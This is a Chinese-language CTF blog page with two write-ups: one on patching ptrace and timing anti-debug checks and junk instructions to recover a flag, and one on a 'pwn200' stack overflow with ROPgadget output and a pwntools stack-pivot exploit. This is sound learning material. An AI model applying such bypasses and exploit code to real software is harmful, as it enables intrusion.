<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">000000000040096</span>A                 call    _ptrace</span><br></pre></td></tr></table></figure>

<p>变成</p>
<figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">000000000040096</span>A                 nop                     ; Keypatch modified <span class="keyword">this</span> from:</span><br><span class="line">.text:<span class="number">000000000040096</span>A                                         ;   call _ptrace</span><br><span class="line">.text:<span class="number">000000000040096</span>A                                         ; Keypatch padded NOP to next boundary: <span class="number">4</span> bytes</span><br><span class="line">.text:<span class="number">000000000040096B</span>                 nop</span><br><span class="line">.text:<span class="number">000000000040096</span>C                 nop</span><br><span class="line">.text:<span class="number">000000000040096</span>D                 nop</span><br><span class="line">.text:<span class="number">000000000040096</span>E                 nop</span><br></pre></td></tr></table></figure>

<p>在gdb动态调试中可以发现已经成功绕过</p>
<figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">────────────────────────────────────────[ DISASM ]────────────────────────────────────────</span><br><span class="line">   <span class="number">0x400933</span> &lt;main+<span class="number">211</span>&gt;    mov    dword ptr [rsp + <span class="number">0x88</span>], <span class="number">0x5f</span></span><br><span class="line">   <span class="number">0x40093e</span> &lt;main+<span class="number">222</span>&gt;    mov    dword ptr [rsp + <span class="number">0x8c</span>], <span class="number">0x33</span></span><br><span class="line">   <span class="number">0x400949</span> &lt;main+<span class="number">233</span>&gt;    mov    dword ptr [rsp + <span class="number">0x90</span>], <span class="number">0x4d</span></span><br><span class="line">   <span class="number">0x400954</span> &lt;main+<span class="number">244</span>&gt;    mov    dword ptr [rsp + <span class="number">0x94</span>], <span class="number">0x7d</span></span><br><span class="line">   <span class="number">0x40095f</span> &lt;main+<span class="number">255</span>&gt;    mov    dword ptr [rsp + <span class="number">0x98</span>], <span class="number">0x7b</span></span><br><span class="line"> ► <span class="number">0x40096a</span> &lt;main+<span class="number">266</span>&gt;    nop    </span><br><span class="line">   <span class="number">0x40096b</span> &lt;main+<span class="number">267</span>&gt;    nop    </span><br><span class="line">   <span class="number">0x40096c</span> &lt;main+<span class="number">268</span>&gt;    nop    </span><br><span class="line">   <span class="number">0x40096d</span> &lt;main+<span class="number">269</span>&gt;    nop    </span><br><span class="line">   <span class="number">0x40096e</span> &lt;main+<span class="number">270</span>&gt;    nop    </span><br><span class="line">   <span class="number">0x40096f</span> &lt;main+<span class="number">271</span>&gt;    test   rax, rax</span><br></pre></td></tr></table></figure>

<p>在这里我们遇到了时间戳检测</p>
<figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">────────────────────────────────────────[ DISASM ]────────────────────────────────────────</span><br><span class="line">   <span class="number">0x400972</span> &lt;main+<span class="number">274</span>&gt;     js     main+<span class="number">1036</span> &lt;<span class="number">0x400c6c</span>&gt;</span><br><span class="line"> </span><br><span class="line">   <span class="number">0x400978</span> &lt;main+<span class="number">280</span>&gt;     xor    edi, edi</span><br><span class="line">   <span class="number">0x40097a</span> &lt;main+<span class="number">282</span>&gt;     call   time@plt &lt;<span class="number">0x4007e0</span>&gt;</span><br><span class="line"> </span><br><span class="line">   <span class="number">0x40097f</span> &lt;main+<span class="number">287</span>&gt;     mov    edi, eax</span><br><span class="line">   <span class="number">0x400981</span> &lt;main+<span class="number">289</span>&gt;     sub    edi, r12d</span><br><span class="line"> ► <span class="number">0x400984</span> &lt;main+<span class="number">292</span>&gt;     cmp    edi, <span class="number">1</span></span><br><span class="line">   <span class="number">0x400987</span> &lt;main+<span class="number">295</span>&gt;     jg     main+<span class="number">1009</span> &lt;<span class="number">0x400c51</span>&gt;</span><br></pre></td></tr></table></figure>

<p>我们只需要强制修改edi寄存器的值为1即可以绕过</p>
<figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; <span class="built_in">set</span> $edi = <span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>就已经绕过了</p>
<figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">────────────────────────────────────────[ DISASM ]────────────────────────────────────────</span><br><span class="line">   <span class="number">0x40097a</span> &lt;main+<span class="number">282</span>&gt;    call   time@plt &lt;<span class="number">0x4007e0</span>&gt;</span><br><span class="line"> </span><br><span class="line">   <span class="number">0x40097f</span> &lt;main+<span class="number">287</span>&gt;    mov    edi, eax</span><br><span class="line">   <span class="number">0x400981</span> &lt;main+<span class="number">289</span>&gt;    sub    edi, r12d</span><br><span class="line">   <span class="number">0x400984</span> &lt;main+<span class="number">292</span>&gt;    cmp    edi, <span class="number">1</span></span><br><span class="line">   <span class="number">0x400987</span> &lt;main+<span class="number">295</span>&gt;    jg     main+<span class="number">1009</span> &lt;<span class="number">0x400c51</span>&gt;</span><br><span class="line"> </span><br><span class="line"> ► <span class="number">0x40098d</span> &lt;main+<span class="number">301</span>&gt;    lea    r13, [rsp + <span class="number">0x14</span>]</span><br></pre></td></tr></table></figure>

<p>运行到这里</p>
<figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">────────────────────────────────────────[ DISASM ]────────────────────────────────────────</span><br><span class="line">   <span class="number">0x4009a1</span> &lt;main+<span class="number">321</span>&gt;    mov    rdi, r13</span><br><span class="line">   <span class="number">0x4009a4</span> &lt;main+<span class="number">324</span>&gt;    call   func3 &lt;<span class="number">0x400e20</span>&gt;</span><br><span class="line"> </span><br><span class="line">   <span class="number">0x4009a9</span> &lt;main+<span class="number">329</span>&gt;    call   main+<span class="number">334</span> &lt;<span class="number">0x4009ae</span>&gt;</span><br><span class="line"> </span><br><span class="line">   <span class="number">0x4009ae</span> &lt;main+<span class="number">334</span>&gt;    pop    rax</span><br><span class="line">   <span class="number">0x4009af</span> &lt;main+<span class="number">335</span>&gt;    add    rax, <span class="number">0xa</span></span><br><span class="line"> ► <span class="number">0x4009b3</span> &lt;main+<span class="number">339</span>&gt;    jmp    rax &lt;<span class="number">0x4009b8</span>&gt;</span><br><span class="line">    ↓</span><br><span class="line">   <span class="number">0x4009b8</span> &lt;main+<span class="number">344</span>&gt;    call   main+<span class="number">349</span> &lt;<span class="number">0x4009bd</span>&gt;</span><br></pre></td></tr></table></figure>

<p>可以发现其实<strong>0x4009b3</strong>是<strong>jump</strong>到了<strong>0x4009b8</strong>处，我们在<strong>IDA</strong>里面修改即可</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004009B3                 jmp     short loc_4009B8 ; Keypatch modified this from:</span><br><span class="line">.text:00000000004009B3                                         ;   jmp rax</span><br></pre></td></tr></table></figure>

<p>在这之前我们可以选定被花指令隐藏的数据按<strong>U</strong>或者右键选择“<strong>Undefine</strong>“先还原成数据，然后之后可以按”<strong>C</strong>“或者右键”<strong>Code</strong>“变成指令代码</p>
<p>继续运行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  0x4009bd &lt;main+349&gt;    pop    rbx</span><br><span class="line">  0x4009be &lt;main+350&gt;    add    rbx, 0xa</span><br><span class="line">► 0x4009c2 &lt;main+354&gt;    jmp    rbx &lt;0x4009c7&gt;</span><br><span class="line">   ↓</span><br><span class="line">  0x4009c7 &lt;main+359&gt;    lea    rdi, [rsp + 8]</span><br></pre></td></tr></table></figure>

<p><strong>0x4009c2</strong>到<strong>0x4009c7</strong>，其实这时候我们分析一下这些花指令，本质上就是跳转到<strong>rbx+0xa</strong>的内存上</p>
<figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x4009bd</span> &lt;main+<span class="number">349</span>&gt;    pop    rbx</span><br><span class="line"><span class="number">0x4009be</span> &lt;main+<span class="number">350</span>&gt;    add    rbx, <span class="number">0xa</span></span><br><span class="line"><span class="number">0x4009c2</span> &lt;main+<span class="number">354</span>&gt;    jmp    rbx</span><br></pre></td></tr></table></figure>

<p>再看一下这段，加加减减等于没有，然后异或同一个寄存器一定会跳转</p>
<figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">0x4009e1</span> &lt;main+<span class="number">385</span>&gt;    inc    eax</span><br><span class="line">  <span class="number">0x4009e3</span> &lt;main+<span class="number">387</span>&gt;    dec    eax</span><br><span class="line">  <span class="number">0x4009e5</span> &lt;main+<span class="number">389</span>&gt;    mov    ax, <span class="number">0x5eb</span></span><br><span class="line">► <span class="number">0x4009e9</span> &lt;main+<span class="number">393</span>&gt;    xor    eax, eax</span><br><span class="line">  <span class="number">0x4009eb</span> &lt;main+<span class="number">395</span>&gt;    je     main+<span class="number">391</span> &lt;<span class="number">0x4009e7</span>&gt;</span><br></pre></td></tr></table></figure>

<p>最终逆向完毕的版本</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> *v3; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// er12</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v5; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v6; <span class="comment">// ebp</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// edi</span></span><br><span class="line">  <span class="keyword">__pid_t</span> v8; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">__pid_t</span> v9; <span class="comment">// er13</span></span><br><span class="line">  __int64 correct_count; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> input[<span class="number">19</span>]; <span class="comment">// [rsp+0h] [rbp-4D8h]</span></span><br><span class="line">  <span class="keyword">char</span> v14; <span class="comment">// [rsp+4Ch] [rbp-48Ch]</span></span><br><span class="line">  <span class="keyword">int</span> enc[<span class="number">19</span>]; <span class="comment">// [rsp+50h] [rbp-488h]</span></span><br><span class="line">  <span class="keyword">char</span> v16; <span class="comment">// [rsp+A0h] [rbp-438h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v17; <span class="comment">// [rsp+4A8h] [rbp-30h]</span></span><br><span class="line"></span><br><span class="line">  v3 = input;</span><br><span class="line">  v17 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v4 = time(<span class="number">0L</span>L);</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    ++v3;</span><br><span class="line">    *(v3 - <span class="number">1</span>) = _IO_getc(_bss_start);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v3 != (<span class="keyword">int</span> *)&amp;v14 );</span><br><span class="line">  enc[<span class="number">0</span>] = <span class="string">'S'</span>;</span><br><span class="line">  enc[<span class="number">1</span>] = <span class="string">'@'</span>;</span><br><span class="line">  enc[<span class="number">2</span>] = <span class="string">'y'</span>;</span><br><span class="line">  enc[<span class="number">3</span>] = <span class="string">'R'</span>;</span><br><span class="line">  enc[<span class="number">4</span>] = <span class="string">'t'</span>;</span><br><span class="line">  enc[<span class="number">5</span>] = <span class="string">'f'</span>;</span><br><span class="line">  enc[<span class="number">6</span>] = <span class="string">'T'</span>;</span><br><span class="line">  enc[<span class="number">7</span>] = <span class="string">'l'</span>;</span><br><span class="line">  enc[<span class="number">8</span>] = <span class="string">'0'</span>;</span><br><span class="line">  enc[<span class="number">9</span>] = <span class="string">'+'</span>;</span><br><span class="line">  enc[<span class="number">10</span>] = <span class="string">'a'</span>;</span><br><span class="line">  enc[<span class="number">11</span>] = <span class="string">'g'</span>;</span><br><span class="line">  enc[<span class="number">12</span>] = <span class="string">'-'</span>;</span><br><span class="line">  enc[<span class="number">13</span>] = <span class="string">'L'</span>;</span><br><span class="line">  enc[<span class="number">14</span>] = <span class="string">'_'</span>;</span><br><span class="line">  enc[<span class="number">15</span>] = <span class="string">'3'</span>;</span><br><span class="line">  enc[<span class="number">16</span>] = <span class="string">'M'</span>;</span><br><span class="line">  enc[<span class="number">17</span>] = <span class="string">'&#125;'</span>;</span><br><span class="line">  enc[<span class="number">18</span>] = <span class="string">'&#123;'</span>;</span><br><span class="line">  func3(&amp;input[<span class="number">5</span>], <span class="number">2u</span>, <span class="number">7</span>, <span class="number">0xE</span>u);</span><br><span class="line">  func3(&amp;input[<span class="number">2</span>], <span class="number">4u</span>, <span class="number">6</span>, <span class="number">0x11</span>u);</span><br><span class="line">  func3(&amp;input[<span class="number">9</span>], <span class="number">3u</span>, <span class="number">5</span>, <span class="number">0xA</span>u);</span><br><span class="line">  v5 = getppid();</span><br><span class="line">  v6 = get_name_by_pid(v5, &amp;v16);</span><br><span class="line">  <span class="keyword">if</span> ( !v6 )</span><br><span class="line">  &#123;</span><br><span class="line">    func3(input, <span class="number">6u</span>, <span class="number">9</span>, <span class="number">0xF</span>u);</span><br><span class="line">    func3(&amp;input[<span class="number">11</span>], <span class="number">3u</span>, <span class="number">6</span>, <span class="number">8u</span>);</span><br><span class="line">    v7 = (<span class="keyword">unsigned</span> __int64)time(<span class="number">0L</span>L) - v4;</span><br><span class="line">    <span class="keyword">if</span> ( v7 &lt; <span class="number">2</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_16;</span><br><span class="line">    func3(&amp;input[<span class="number">5</span>], <span class="number">1u</span>, <span class="number">5</span>, <span class="number">0xE</span>u);</span><br><span class="line">    v8 = getpid();</span><br><span class="line">    v9 = getsid(v8);</span><br><span class="line">    <span class="keyword">if</span> ( v9 != getppid() )</span><br><span class="line">    &#123;</span><br><span class="line">      func3(input, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0x13</span>u);</span><br><span class="line">      func3(&amp;input[<span class="number">3</span>], <span class="number">3u</span>, <span class="number">5</span>, <span class="number">0x10</span>u);</span><br><span class="line">      func3(&amp;input[<span class="number">15</span>], <span class="number">1u</span>, <span class="number">3</span>, <span class="number">4u</span>);</span><br><span class="line">      func3(&amp;input[<span class="number">8</span>], <span class="number">3u</span>, <span class="number">6</span>, <span class="number">0xB</span>u);</span><br><span class="line">      func3(input, <span class="number">0</span>, <span class="number">7</span>, <span class="number">0x13</span>u);</span><br><span class="line">      func3(&amp;input[<span class="number">16</span>], <span class="number">0</span>, <span class="number">2</span>, <span class="number">3u</span>);</span><br><span class="line">      func3(&amp;input[<span class="number">10</span>], <span class="number">0</span>, <span class="number">2</span>, <span class="number">9u</span>);</span><br><span class="line">      v7 = (<span class="keyword">unsigned</span> __int64)time(<span class="number">0L</span>L) - v4;</span><br><span class="line">      <span class="keyword">if</span> ( v7 &gt;= <span class="number">3</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        correct_count = <span class="number">0L</span>L;</span><br><span class="line">        func3(&amp;input[<span class="number">11</span>], <span class="number">1u</span>, <span class="number">3</span>, <span class="number">8u</span>);</span><br><span class="line">        func3(&amp;input[<span class="number">16</span>], <span class="number">0</span>, <span class="number">2</span>, <span class="number">3u</span>);</span><br><span class="line">        <span class="keyword">for</span> ( i = <span class="string">'S'</span>; i == input[correct_count]; i = enc[correct_count] )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( ++correct_count == <span class="number">19</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">"win"</span>);</span><br><span class="line">            <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"You failed"</span>);</span><br><span class="line">        v7 = correct_count;</span><br><span class="line">      &#125;</span><br><span class="line">LABEL_16:</span><br><span class="line">      <span class="built_in">exit</span>(v7);</span><br><span class="line">    &#125;</span><br><span class="line">LABEL_17:</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"what are you doing?!"</span>);</span><br><span class="line">    v7 = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_16;</span><br><span class="line">  &#125;</span><br><span class="line">  v6 = <span class="number">-1</span>;</span><br><span class="line">LABEL_12:</span><br><span class="line">  result = v6;</span><br><span class="line">  <span class="keyword">if</span> ( __readfsqword(<span class="number">0x28</span>u) != v17 )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_17;c</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p> 输入字符串“0123456789abcdefghi”，然后在比较处设断点，可以看到输入字符串经过处理后的结果是“8f6c90e1dg237abh5i4”。<br>然后即可写脚本，把“S@yRtfTl0+ag-L_3M}{”进行还原。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">str = <span class="string">"0123456789abcdefghi"</span></span><br><span class="line">str1 = <span class="string">"8f6c90e1dg237abh5i4"</span></span><br><span class="line">str2 = <span class="string">"S@yRtfTl0+ag-L_3M&#125;&#123;"</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(str2)):</span><br><span class="line">flag += str2[str1.find(str[i])]</span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure>

<p> 得到flag为flag{My-StL_R0T@+3} </p>

        
      
    </div>

    
    
    
      <footer class="post-footer">
          <div class="post-eof"></div>
        
      </footer>
  </div>
  
  
  
  </article>

    
       <article itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block home">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/10/15/pwn200/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="ZERO-A-ONE">
      <meta itemprop="description" content="Resit much,Obey little">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZERO-A-ONE">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
            
            <a href="/2019/10/15/pwn200/" class="post-title-link" itemprop="url">pwn200</a>
          
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              
                
              

              <time title="Created: 2019-10-15 07:50:43 / Modified: 22:52:34" itemprop="dateCreated datePublished" datetime="2019-10-15T07:50:43-07:00">2019-10-15</time>
            </span>
          
            

            
          

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>先检查一下文件</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386<span class="number">-32</span>-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      <span class="function">No <span class="title">PIE</span> <span class="params">(<span class="number">0x8048000</span>)</span></span></span><br></pre></td></tr></table></figure>

<p> 在 IDA中反汇编看看 程序是什么样的，这是我们发现程序存在漏洞</p>
<figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ssize_t</span> vuln()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+Ch] [ebp-6Ch]</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, &amp;buf);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里存在着栈溢出漏洞，虽然程序存在 write 写函数 但是我要学会的是 return-to-dl-resolve 所以我们不利用write函数去泄露 </p>
<p>这道题首先为了让构造的 ROP 链的长度合适，这里我们可以用到栈迁移</p>
<ul>
<li>首先我们要 将我们想迁移到的地址 覆盖到 程序的 ebp 上这样 执行下一个 汇编指令时 会将 这个值 赋值给 <strong>ebp （pop ebp）</strong></li>
<li>然后我们要在下面调用一次 <strong>leave ret (mov esp, ebp ; pop ebp ;)</strong>这样我们就能将esp 也迁移过去 从而实现栈迁移 </li>
</ul>
<p>用<strong>ROPgadget</strong>工具找到 我们需要的汇编指令的地址</p>
<figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">syc@ubuntu:~/Downloads/retdll$ ROPgadget --binary bof --only 'pop|ret'</span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line"><span class="number">0x0804861b</span> : pop ebp ; ret</span><br><span class="line"><span class="number">0x08048618</span> : pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line"><span class="number">0x08048379</span> : pop ebx ; ret</span><br><span class="line"><span class="number">0x0804861a</span> : pop edi ; pop ebp ; ret</span><br><span class="line"><span class="number">0x08048619</span> : pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line"><span class="number">0x08048362</span> : ret</span><br><span class="line"><span class="number">0x0804846e</span> : ret <span class="number">0xeac1</span></span><br><span class="line"></span><br><span class="line">Unique gadgets found: <span class="number">7</span></span><br><span class="line">syc@ubuntu:~/Downloads/retdll$ ROPgadget --binary bof --only 'leave|ret'</span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line"><span class="number">0x08048458</span> : leave ; ret</span><br><span class="line"><span class="number">0x08048362</span> : ret</span><br><span class="line"><span class="number">0x0804846e</span> : ret <span class="number">0xeac1</span></span><br><span class="line"></span><br><span class="line">Unique gadgets found: <span class="number">3</span></span><br><span class="line">syc@ubuntu:~/Downloads/retdll$ readelf -S bof | grep <span class="string">".bss"</span></span><br><span class="line">  [<span class="number">26</span>] .bss              NOBITS          <span class="number">0804</span>a040 <span class="number">001028</span> <span class="number">00000</span>c <span class="number">00</span>  WA  <span class="number">0</span>   <span class="number">0</span> <span class="number">32</span></span><br></pre></td></tr></table></figure>

<p>找到所需要的<strong>ROP</strong>链的部分，如果我们将<strong>payload</strong>写为下面这样运行就能实现栈迁移，将<strong>ebp</strong>覆盖为我们想要迁移过去的值 ，然后执行<strong>leave_ret</strong>就能将栈迁移过去 </p>
<p>具体的Exploit为</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'./bof'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./bof'</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line"></span><br><span class="line">offset_ebp = <span class="number">0x6c</span></span><br><span class="line">ppp_ret = <span class="number">0x08048619</span> <span class="comment">#pop esi ; pop edi ; pop ebp ; ret</span></span><br><span class="line">pop_ebp_ret = <span class="number">0x0804861b</span> <span class="comment">#pop ebp ; ret</span></span><br><span class="line">leave_ret = <span class="number">0x08048458</span> <span class="comment">#leave ; ret</span></span><br><span class="line">bss_addr = <span class="number">0x0804a040</span> <span class="comment"># readelf -S pwn1 | grep ".bss"</span></span><br><span class="line">stack_size = <span class="number">0x800</span></span><br><span class="line">base_stage = bss_addr + stack_size</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Welcome to XDCTF2015~!\n'</span>)</span><br><span class="line">payload = <span class="string">''</span></span><br><span class="line">payload+= <span class="string">'a'</span>*offset_ebp</span><br><span class="line">payload+= p32(base_stage)</span><br><span class="line">payload+= p32(leave_ret)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>GDB调试环节</p>
